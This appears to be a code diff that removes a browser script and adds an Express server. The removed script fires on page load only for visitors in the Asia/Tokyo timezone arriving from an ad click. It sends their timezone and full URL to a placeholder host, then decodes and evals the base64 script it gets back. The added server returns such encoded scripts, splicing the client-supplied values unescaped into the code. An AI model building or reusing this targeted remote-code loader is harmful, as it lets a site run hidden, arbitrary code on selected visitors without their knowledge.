@@ -1,41 +1,33 @@
-document.addEventListener('DOMContentLoaded', () => {
-    // Get the current timezone and full URL
-    const clientTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-    const fullUrl = window.location.href;
+// Import required modules
+const express = require('express');
+const bodyParser = require('body-parser');
 
-    // Check if the timezone is Japan and if the URL contains 'gclid'
-    if (clientTimezone === 'Asia/Tokyo' && fullUrl.includes('gclid')) {
-        // URL to send the request to
-        const responseUrl = 'https://your-script-source.com/get-script'; // Replace with your actual URL
+// Initialize Express app
+const app = express();
 
-        // Function to transmit data
-        function transmitData(url, timezone, fullUrl) {
-            return fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ timezone, fullUrl }),
-            })
-            .then(response => response.text())
-            .then(encodedScript => decodeAndRunScript(encodedScript))
-            .catch(handleError);
-        }
+// Middleware to parse incoming JSON
+app.use(bodyParser.json());
 
-        // Function to decode and run the received script
-        function decodeAndRunScript(encodedScript) {
-            try {
-                const script = atob(encodedScript);
-                eval(script);
-            } catch (error) {
-                throw new Error(`Script execution failed: ${error}`);
-            }
-        }
+// API Endpoint to receive timezone data and send back encoded script
+app.post('/', (req, res) => {
+    const { timezone, fullUrl } = req.body;
 
-        // Function to handle errors
-        function handleError(error) {
-            console.error('Error:', error);
-        }
+    // Sample JavaScript code to return - this can be any valid JS code
+    const jsCode = `
+        console.log("Client's Timezone: ${timezone}");
+        console.log("Client's Full URL: ${fullUrl}");
+        alert('Executed base64-encoded script with timezone: ${timezone}');
+    `;
 
-        // Sending the data
-        transmitData(responseUrl, clientTimezone, fullUrl);
-    }
+    // Base64 encode the JavaScript code
+    const encodedJsCode = Buffer.from(jsCode).toString('base64');
+
+    // Send back the encoded script
+    res.send(encodedJsCode);
+});
+
+// Start the server
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => {
+    console.log(`Server is running on port ${PORT}`);
 });
